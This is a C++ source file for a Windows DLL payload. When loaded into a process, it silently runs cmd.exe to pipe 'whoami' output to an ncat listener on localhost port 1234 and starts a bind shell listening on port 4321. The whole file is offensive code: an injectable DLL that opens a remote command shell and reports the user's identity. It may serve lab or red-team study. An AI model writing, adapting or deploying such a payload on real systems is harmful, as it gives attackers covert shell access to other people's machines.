// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "BindShell.h"

DWORD APIENTRY OnDllDetach(LPVOID lpParameter)
{
    Sleep(500);
    FreeLibraryAndExitThread((HMODULE)lpParameter, 0);
    return 0;
}

//             OnDllAttach(HMODULE hModule)
DWORD APIENTRY OnDllAttach(LPVOID lpParameter)
{
    // ncat -l 1234
    std::wstring cmdPath = L"C:\\Windows\\System32\\cmd.exe";
    std::wstring args = L"whoami | ncat localhost 1234";
    RunCmd(cmdPath, args, false, CREATE_NO_WINDOW);

    /*
    if (!descStr.empty())
    {
        //std::wstring cmdArgs2 = L"C:\\Windows\\System32\\cmd.exe /k echo " + descStr + L" | ncat localhost 1234";
        CreateProcess(cmdPath, &cmdArgs2[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    */

    return 0;
}

DWORD APIENTRY BindShellThread(LPVOID lpParameter) {
    BindShell* bindShell = new BindShell(4321);

    bindShell->Bingus();

    delete bindShell;

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OnDllDetach, lpParameter, 0, NULL);

    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  dwReason,
                       LPVOID lpReserved
                     )
{

    if (dwReason == DLL_PROCESS_ATTACH)
    {
        // disable DLL_THREAD_ATTACH and DLL_THREAD_DETACH reasons to call
        DisableThreadLibraryCalls(hModule);

        /*
        HANDLE hThread = GetCurrentThread();
        PWSTR desc;
        if (SUCCEEDED(GetThreadDescription(hThread, &desc)))
        {
            descStr = desc;
            LocalFree(desc); // dnt forget to manually LocalFree
        }
        */

        // create main thread
        // (LPTHREAD_START_ROUTINE) OnDllAttach
        CreateThread(NULL, 0, OnDllAttach, hModule, 0, NULL);

        // create bindshell thread
        CreateThread(NULL, 0, BindShellThread, hModule, 0, NULL);
    }
    else if (dwReason == DLL_PROCESS_DETACH )
    {
        //WaitForSingleObject(hThread, INFINITE);
        //FreeLibraryAndExitThread((HMODULE)lpReserved, EXIT_SUCCESS);
        //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OnDllDetach, lpParameter, 0, NULL);
    }

    return TRUE;
}

